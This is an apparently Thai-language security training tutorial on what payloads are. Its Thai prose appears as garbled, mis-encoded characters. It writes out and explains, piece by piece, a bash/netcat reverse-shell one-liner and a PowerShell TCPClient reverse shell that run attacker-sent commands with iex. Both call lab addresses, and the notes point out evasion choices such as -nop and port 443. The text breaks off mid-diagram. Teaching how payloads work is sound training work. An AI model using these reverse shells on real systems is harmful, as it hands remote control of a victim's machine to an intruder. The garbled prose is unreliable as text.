# Introduction to Payloads - ‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡πÄ‡∏ä‡∏¥‡∏á‡∏•‡∏∂‡∏Å‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö Payload

## Payload ‡∏Ñ‡∏∑‡∏≠‡∏≠‡∏∞‡πÑ‡∏£?

‡πÄ‡∏Ñ‡∏¢‡∏™‡πà‡∏á‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏´‡∏£‡∏∑‡∏≠‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏≤‡πÉ‡∏Ñ‡∏£‡πÑ‡∏´‡∏°? **‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏™‡πà‡∏á**‡∏ô‡∏±‡πà‡∏ô‡πÅ‡∏´‡∏•‡∏∞‡∏Ñ‡∏∑‡∏≠ **payload** ‡∏Ç‡∏≠‡∏á packet ‡∏ó‡∏µ‡πà‡πÄ‡∏î‡∏¥‡∏ô‡∏ó‡∏≤‡∏á‡∏ú‡πà‡∏≤‡∏ô‡∏≠‡∏¥‡∏ô‡πÄ‡∏ó‡∏≠‡∏£‡πå‡πÄ‡∏ô‡πá‡∏ï

### ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏°‡∏≤‡∏¢‡∏Ç‡∏≠‡∏á Payload ‡πÉ‡∏ô‡πÅ‡∏ï‡πà‡∏•‡∏∞‡∏ö‡∏£‡∏¥‡∏ö‡∏ó:

**1. ‡πÉ‡∏ô‡∏ß‡∏á‡∏Å‡∏≤‡∏£‡∏Ñ‡∏≠‡∏°‡∏û‡∏¥‡∏ß‡πÄ‡∏ï‡∏≠‡∏£‡πå‡∏ó‡∏±‡πà‡∏ß‡πÑ‡∏õ:**
- Payload = ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏£‡∏∑‡∏≠‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á

**2. ‡πÉ‡∏ô‡∏î‡πâ‡∏≤‡∏ô‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢‡∏™‡∏≤‡∏£‡∏™‡∏ô‡πÄ‡∏ó‡∏®:**
- Payload = **‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡πÅ‡∏•‡∏∞/‡∏´‡∏£‡∏∑‡∏≠‡πÇ‡∏Ñ‡πâ‡∏î‡∏ó‡∏µ‡πà exploit ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà** ‡πÉ‡∏ô OS ‡πÅ‡∏•‡∏∞/‡∏´‡∏£‡∏∑‡∏≠‡πÅ‡∏≠‡∏õ‡∏û‡∏•‡∏¥‡πÄ‡∏Ñ‡∏ä‡∏±‡∏ô

**3. ‡∏à‡∏≤‡∏Å‡∏°‡∏∏‡∏°‡∏°‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô:**
- Payload = ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡πÅ‡∏•‡∏∞/‡∏´‡∏£‡∏∑‡∏≠‡πÇ‡∏Ñ‡πâ‡∏î‡∏ó‡∏µ‡πà**‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏Å‡∏£‡∏∞‡∏ó‡∏≥‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡πá‡∏ô‡∏≠‡∏±‡∏ô‡∏ï‡∏£‡∏≤‡∏¢**

### ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏à‡∏≤‡∏Å‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏õ‡πá‡∏ô‡∏à‡∏£‡∏¥‡∏á:
‡πÉ‡∏ô‡∏´‡∏±‡∏ß‡∏Ç‡πâ‡∏≠ Reverse Shells ‡πÄ‡∏£‡∏≤‡πÄ‡∏´‡πá‡∏ô Windows Defender ‡∏´‡∏¢‡∏∏‡∏î‡∏Å‡∏≤‡∏£‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏Ç‡∏≠‡∏á PowerShell payload ‡πÄ‡∏û‡∏£‡∏≤‡∏∞‡∏°‡∏±‡∏ô‡∏ñ‡∏π‡∏Å‡∏°‡∏≠‡∏á‡∏ß‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡πÇ‡∏Ñ‡πâ‡∏î‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡πá‡∏ô‡∏≠‡∏±‡∏ô‡∏ï‡∏£‡∏≤‡∏¢

## ‡∏ó‡∏≥‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡∏Å‡∏±‡∏ö Payload

**‡∏™‡∏¥‡πà‡∏á‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏à‡∏≥:**
- ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏£‡∏≤‡∏™‡πà‡∏á‡πÅ‡∏•‡∏∞‡∏£‡∏±‡∏ô payload ‡∏°‡∏±‡∏ô‡∏Å‡πá‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡πÇ‡∏õ‡∏£‡πÅ‡∏Å‡∏£‡∏°‡∏ó‡∏±‡πà‡∏ß‡πÑ‡∏õ
- ‡πÄ‡∏£‡∏≤‡∏Å‡∏≥‡∏•‡∏±‡∏á**‡πÉ‡∏´‡πâ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏Å‡∏±‡∏ö‡∏Ñ‡∏≠‡∏°‡∏û‡∏¥‡∏ß‡πÄ‡∏ï‡∏≠‡∏£‡πå‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢**‡∏ß‡πà‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥‡∏≠‡∏∞‡πÑ‡∏£
- ‡∏Ñ‡∏≥‡∏ß‡πà‡∏≤ "malware" ‡∏´‡∏£‡∏∑‡∏≠ "malicious code" ‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡∏ü‡∏±‡∏á‡∏î‡∏π‡∏•‡∏∂‡∏Å‡∏•‡∏±‡∏ö‡πÄ‡∏Å‡∏¥‡∏ô‡πÑ‡∏õ
- **‡∏Ñ‡∏ß‡∏≤‡∏°‡∏à‡∏£‡∏¥‡∏á‡∏Ñ‡∏∑‡∏≠‡∏°‡∏±‡∏ô‡∏Å‡πá‡πÅ‡∏Ñ‡πà‡πÇ‡∏Ñ‡πâ‡∏î‡πÅ‡∏•‡∏∞‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ò‡∏£‡∏£‡∏°‡∏î‡∏≤**

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ó‡πâ‡∏≤‡∏ó‡∏≤‡∏¢‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÄ‡∏£‡∏≤:**
‡∏•‡∏≠‡∏á‡∏®‡∏∂‡∏Å‡∏©‡∏≤‡∏ß‡πà‡∏≤‡πÇ‡∏Ñ‡πâ‡∏î‡πÅ‡∏•‡∏∞‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏≠‡∏¢‡πà‡∏≤‡∏á‡πÑ‡∏£‡∏à‡∏£‡∏¥‡∏á‡πÜ ‡∏°‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏±‡∏ô‡∏ó‡∏µ‡πà‡∏Å‡∏≤‡∏£‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå one-liner ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡πÉ‡∏ä‡πâ‡πÑ‡∏õ‡∏Å‡πà‡∏≠‡∏ô‡∏´‡∏ô‡πâ‡∏≤‡∏ô‡∏µ‡πâ

---

## ‡∏Å‡∏≤‡∏£‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå One-Liners

### 1. Netcat/Bash Reverse Shell One-liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

‡∏ô‡∏µ‡πà‡∏Ñ‡∏∑‡∏≠ one-liner ‡∏ó‡∏µ‡πà‡∏ô‡∏¥‡∏¢‡∏°‡πÉ‡∏ä‡πâ‡∏ö‡∏ô‡∏£‡∏∞‡∏ö‡∏ö Linux ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£ Bash shell ‡∏ö‡∏ô network socket ‡πÇ‡∏î‡∏¢‡πÉ‡∏ä‡πâ Netcat listener

#### ‡∏°‡∏≤‡πÅ‡∏¢‡∏Å‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏ó‡∏µ‡∏•‡∏∞‡∏™‡πà‡∏ß‡∏ô:

**‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 1: ‡∏•‡∏ö‡πÑ‡∏ü‡∏•‡πå /tmp/f**
```bash
rm -f /tmp/f;
```
- ‡∏•‡∏ö‡πÑ‡∏ü‡∏•‡πå `/tmp/f` ‡∏ñ‡πâ‡∏≤‡∏°‡∏µ‡∏≠‡∏¢‡∏π‡πà
- `-f` ‡∏ö‡∏±‡∏á‡∏Ñ‡∏±‡∏ö‡πÉ‡∏´‡πâ rm ‡∏Ç‡πâ‡∏≤‡∏°/‡πÑ‡∏°‡πà‡πÅ‡∏™‡∏î‡∏á error ‡∏ñ‡πâ‡∏≤‡πÑ‡∏ü‡∏•‡πå‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏≠‡∏¢‡∏π‡πà
- `;` (‡πÄ‡∏ã‡∏°‡∏¥‡πÇ‡∏Ñ‡∏•‡∏≠‡∏ô) ‡πÉ‡∏ä‡πâ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏£‡∏±‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ï‡∏≤‡∏°‡∏•‡∏≥‡∏î‡∏±‡∏ö

**‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 2: ‡∏™‡∏£‡πâ‡∏≤‡∏á Named Pipe**
```bash
mkfifo /tmp/f;
```
- ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÑ‡∏ü‡∏•‡πå **FIFO named pipe** ‡∏ó‡∏µ‡πà‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á `/tmp/f`
- FIFO = First In First Out (‡πÄ‡∏Ç‡πâ‡∏≤‡∏Å‡πà‡∏≠‡∏ô‡∏≠‡∏≠‡∏Å‡∏Å‡πà‡∏≠‡∏ô)
- `;` ‡∏£‡∏±‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ï‡∏≤‡∏°‡∏•‡∏≥‡∏î‡∏±‡∏ö

**‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 3: Output Redirection**
```bash
cat /tmp/f |
```
- Concatenate (‡∏£‡∏ß‡∏°) ‡πÑ‡∏ü‡∏•‡πå FIFO named pipe `/tmp/f`
- `|` (pipe) ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ standard output ‡∏Ç‡∏≠‡∏á `cat /tmp/f` ‡πÑ‡∏õ‡∏¢‡∏±‡∏á standard input ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ñ‡∏±‡∏î‡πÑ‡∏õ

**‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 4: ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ Shell Options**
```bash
/bin/bash -i 2>&1 |
```
- ‡∏£‡∏∞‡∏ö‡∏∏ command language interpreter (Bash)
- `-i` ‡∏ó‡∏≥‡πÉ‡∏´‡πâ shell ‡πÄ‡∏õ‡πá‡∏ô‡πÅ‡∏ö‡∏ö interactive
- `2>&1` redirect standard error (2) ‡πÅ‡∏•‡∏∞ standard output (1) ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏´‡∏•‡∏±‡∏á pipe

**‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 5: ‡πÄ‡∏õ‡∏¥‡∏î‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏î‡πâ‡∏ß‡∏¢ Netcat**
```bash
nc 10.10.14.12 7777 > /tmp/f
```
- ‡πÉ‡∏ä‡πâ Netcat ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ IP `10.10.14.12` port `7777`
- `>` redirect output ‡πÑ‡∏õ‡∏¢‡∏±‡∏á `/tmp/f`
- **‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:** ‡∏™‡πà‡∏á Bash shell ‡πÑ‡∏õ‡∏¢‡∏±‡∏á Netcat listener ‡∏ó‡∏µ‡πà‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏£‡∏≠‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏≠‡∏¢‡∏π‡πà

---

### 2. PowerShell One-liner

PowerShell Reverse Shell ‡∏ô‡∏µ‡πâ‡∏ã‡∏±‡∏ö‡∏ã‡πâ‡∏≠‡∏ô‡∏Å‡∏ß‡πà‡∏≤ Linux shell ‡∏Ñ‡∏£‡∏±‡∏ö ‡∏°‡∏≤‡πÅ‡∏¢‡∏Å‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏ó‡∏µ‡∏•‡∏∞‡∏™‡πà‡∏ß‡∏ô:

## ‡πÅ‡∏¢‡∏Å‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á

```powershell
powershell -nop -c "..."
```

### Flags
- `-nop` = `-NoProfile` - ‡πÑ‡∏°‡πà‡πÇ‡∏´‡∏•‡∏î PowerShell profile (‡πÄ‡∏£‡πá‡∏ß‡∏Ç‡∏∂‡πâ‡∏ô, ‡∏´‡∏•‡∏ö detection)
- `-c` = `-Command` - ‡∏£‡∏±‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ó‡∏µ‡πà‡∏ï‡∏≤‡∏°‡∏´‡∏•‡∏±‡∏á

---

## ‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 1: ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ TCP

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
```

**‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢:**
- ‡∏™‡∏£‡πâ‡∏≤‡∏á TCP client object
- ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏ó‡∏µ‡πà **10.10.14.158:443** (Attacker's IP:Port)
- Port 443 (HTTPS) ‡πÉ‡∏ä‡πâ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏ö firewall ‡∏ó‡∏µ‡πà‡∏°‡∏±‡∏Å‡πÄ‡∏õ‡∏¥‡∏î port ‡∏ô‡∏µ‡πâ‡πÑ‡∏ß‡πâ

```powershell
$stream = $client.GetStream();
```

**‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢:**
- ‡∏£‡∏±‡∏ö **NetworkStream** object
- ‡πÉ‡∏ä‡πâ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏≠‡πà‡∏≤‡∏ô/‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡πà‡∏≤‡∏ô TCP connection
- ‡∏Ñ‡∏•‡πâ‡∏≤‡∏¢ file descriptor ‡πÉ‡∏ô Linux

---

## ‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 2: ‡∏™‡∏£‡πâ‡∏≤‡∏á Buffer

```powershell
[byte[]]$bytes = 0..65535|%{0};
```

**‡πÅ‡∏¢‡∏Å‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå:**
```powershell
0..65535        # ‡∏™‡∏£‡πâ‡∏≤‡∏á array [0,1,2,...,65535]
|%{0}           # foreach item, replace with 0
[byte[]]        # cast ‡πÄ‡∏õ‡πá‡∏ô byte array
```

**‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:**
- ‡∏™‡∏£‡πâ‡∏≤‡∏á **byte array ‡∏Ç‡∏ô‡∏≤‡∏î 65,536 bytes** (64KB)
- ‡πÄ‡∏õ‡πá‡∏ô buffer ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏£‡∏±‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å attacker
- ‡∏ó‡∏∏‡∏Å element ‡πÄ‡∏õ‡πá‡∏ô 0

**‡∏ó‡∏≥‡πÑ‡∏°‡πÉ‡∏ä‡πâ 65535?**
- 65535 = 2^16 - 1 (‡∏Ç‡∏ô‡∏≤‡∏î maximum TCP packet)
- Buffer ‡πÉ‡∏´‡∏ç‡πà‡∏û‡∏≠‡∏£‡∏±‡∏ö‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏¢‡∏≤‡∏ß‡πÜ

---

## ‡∏™‡πà‡∏ß‡∏ô‡∏ó‡∏µ‡πà 3: Main Loop - ‡∏£‡∏±‡∏ö‡πÅ‡∏•‡∏∞ Execute ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # ... code ...
}
```

**‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢:**
- `$stream.Read($bytes, 0, $bytes.Length)` - ‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å network stream ‡πÄ‡∏Ç‡πâ‡∏≤ buffer
  - `$bytes` = buffer ‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•
  - `0` = ‡πÄ‡∏£‡∏¥‡πà‡∏°‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡∏ó‡∏µ‡πà index 0
  - `$bytes.Length` = ‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏î‡πâ‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î‡πÄ‡∏ó‡πà‡∏≤‡πÑ‡∏£
  - Return = ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô bytes ‡∏ó‡∏µ‡πà‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏î‡πâ (‡πÄ‡∏Å‡πá‡∏ö‡πÉ‡∏ô `$i`)
- `-ne 0` = loop ‡∏à‡∏ô‡∏Å‡∏ß‡πà‡∏≤ connection ‡∏à‡∏∞‡∏õ‡∏¥‡∏î (‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏î‡πâ 0 bytes)

---

### ‡∏Ç‡∏±‡πâ‡∏ô‡∏ó‡∏µ‡πà 3.1: ‡πÅ‡∏õ‡∏•‡∏á Bytes ‡πÄ‡∏õ‡πá‡∏ô String

```powershell
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
```

**‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢:**
- ‡∏™‡∏£‡πâ‡∏≤‡∏á ASCII encoder object
- ‡πÅ‡∏õ‡∏•‡∏á byte array ‚Üí string
- ‡∏≠‡πà‡∏≤‡∏ô `$i` bytes (‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏ó‡∏µ‡πà‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏î‡πâ‡∏à‡∏£‡∏¥‡∏á)
- `$data` = ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ó‡∏µ‡πà attacker ‡∏™‡πà‡∏á‡∏°‡∏≤ (‡πÄ‡∏ä‡πà‡∏ô "whoami")

---

### ‡∏Ç‡∏±‡πâ‡∏ô‡∏ó‡∏µ‡πà 3.2: Execute ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á

```powershell
$sendback = (iex $data 2>&1 | Out-String );
```

**‡πÅ‡∏¢‡∏Å‡∏™‡πà‡∏ß‡∏ô:**

**`iex $data`**
- `iex` = `Invoke-Expression`
- ‡∏£‡∏±‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á PowerShell ‡∏ó‡∏µ‡πà‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô `$data`
- ‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô `eval()` ‡πÉ‡∏ô Python

**`2>&1`**
- Redirect error stream (2) ‚Üí success stream (1)
- ‡∏ó‡∏≥‡πÉ‡∏´‡πâ error messages ‡πÅ‡∏™‡∏î‡∏á‡∏î‡πâ‡∏ß‡∏¢

**`| Out-String`**
- ‡πÅ‡∏õ‡∏•‡∏á output objects ‚Üí string
- PowerShell objects ‡∏ï‡πâ‡∏≠‡∏á‡πÅ‡∏õ‡∏•‡∏á‡πÄ‡∏õ‡πá‡∏ô text ‡∏Å‡πà‡∏≠‡∏ô‡∏™‡πà‡∏á

**‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:**
- `$sendback` = output ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ó‡∏µ‡πà‡∏£‡∏±‡∏ô

---

### ‡∏Ç‡∏±‡πâ‡∏ô‡∏ó‡∏µ‡πà 3.3: ‡∏™‡∏£‡πâ‡∏≤‡∏á Prompt

```powershell
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
```

**‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢:**
- `(pwd).Path` = Current directory path
- ‡∏™‡∏£‡πâ‡∏≤‡∏á prompt ‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô terminal ‡∏à‡∏£‡∏¥‡∏á
- ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á: `PS C:\Users\victim> `

**‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:**
```
[command output]
PS C:\Users\victim> 
```

---

### ‡∏Ç‡∏±‡πâ‡∏ô‡∏ó‡∏µ‡πà 3.4: ‡∏™‡πà‡∏á Output ‡∏Å‡∏•‡∏±‡∏ö

```powershell
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
```

**‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢:**
- ‡πÅ‡∏õ‡∏•‡∏á string ‚Üí byte array (ASCII encoding)
- Network stream ‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£ bytes ‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà string

```powershell
$stream.Write($sendbyte,0,$sendbyte.Length);
```

**‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢:**
- ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô bytes ‡πÑ‡∏õ‡∏¢‡∏±‡∏á network stream
- ‡∏™‡πà‡∏á‡∏Å‡∏•‡∏±‡∏ö‡πÑ‡∏õ‡∏´‡∏≤ attacker
- `0` = ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏≠‡πà‡∏≤‡∏ô‡∏à‡∏≤‡∏Å index 0
- `$sendbyte.Length` = ‡∏™‡πà‡∏á‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î

```powershell
$stream.Flush();
```

**‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢:**
- Flush buffer ‡πÉ‡∏´‡πâ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏±‡∏ô‡∏ó‡∏µ
- ‡πÑ‡∏°‡πà‡∏£‡∏≠‡πÉ‡∏´‡πâ buffer ‡πÄ‡∏ï‡πá‡∏°‡∏Å‡πà‡∏≠‡∏ô

---

### ‡∏Ç‡∏±‡πâ‡∏ô‡∏ó‡∏µ‡πà 3.5: ‡∏õ‡∏¥‡∏î‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠

```powershell
$client.Close()
```

**‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢:**
- ‡∏õ‡∏¥‡∏î TCP connection
- ‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡πÄ‡∏°‡∏∑‡πà‡∏≠ loop ‡∏à‡∏ö (connection ‡∏Ç‡∏≤‡∏î)

---

## Flow Diagram

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              Victim Machine (PowerShell)             ‚îÇ
‚îÇ                                                       ‚îÇ
‚îÇ  1. ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏´‡∏≤ Attacker (10.10.14.158:443)       ‚îÇ
‚îÇ     TCPClient.Connect()                              ‚îÇ
‚îÇ          ‚îÇ                                            ‚îÇ
‚îÇ          ‚ñº                                            ‚îÇ
‚îÇ  2. Loop: ‡∏£‡∏≠‡∏£‡∏±‡∏ö‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á                                ‚îÇ
‚îÇ     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                 ‚îÇ
‚îÇ     ‚îÇ $stream.Read() ‚Üí $bytes     ‚îÇ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îÇ
‚îÇ     ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò         ‚îÇ       ‚îÇ
‚îÇ                ‚ñº                             ‚îÇ       ‚îÇ
‚îÇ     3. ‡πÅ‡∏õ‡∏•‡∏á bytes ‚Üí string                  ‚îÇ       ‚îÇ
‚îÇ        GetString($bytes)                     ‚îÇ       ‚îÇ
‚îÇ                ‚ñº                             ‚îÇ       ‚îÇ
‚îÇ     4. Execute ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á                        ‚îÇ       ‚îÇ
‚îÇ        iex $data                             ‚îÇ       ‚îÇ
‚îÇ                ‚ñº                             ‚îÇ       ‚îÇ
‚îÇ     5. ‡πÅ‡∏õ‡∏•‡∏á output ‚Üí string                 ‚îÇ       ‚îÇ
‚îÇ        Out-String                            ‚îÇ       ‚îÇ
‚îÇ                ‚ñº                             ‚îÇ       ‚îÇ
